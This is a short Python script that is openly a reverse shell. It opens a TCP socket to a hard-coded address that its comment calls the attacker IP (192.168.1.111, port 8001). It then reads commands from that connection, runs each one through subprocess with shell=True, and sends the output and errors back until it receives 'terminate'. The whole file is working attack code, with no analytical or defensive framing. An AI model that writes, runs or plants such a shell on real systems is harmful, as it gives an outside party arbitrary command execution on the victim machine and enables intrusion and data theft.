#!/usr/bin/python

import socket
import subprocess # CLI shell started on the system

def connect():
   # AF_INET as a pair of (host,port) | SOCK_STREAM (default mode)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     # Attacker IP with the same port
    s.connect(('192.168.1.111', 8001))

    while True:
        command = s.recv(1024) # receiving communications
        if 'terminate' in command:
            s.close() # closing the socket if 'terminate'
            break
        else:
            # piping the stdout the the subprocess module using the Shell
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # execution handling
            s.send(CMD.stdout.read()) # STDOUT
            s.send(CMD.stderr.read()) # STERR (return errors)

def main():
    connect()
main()
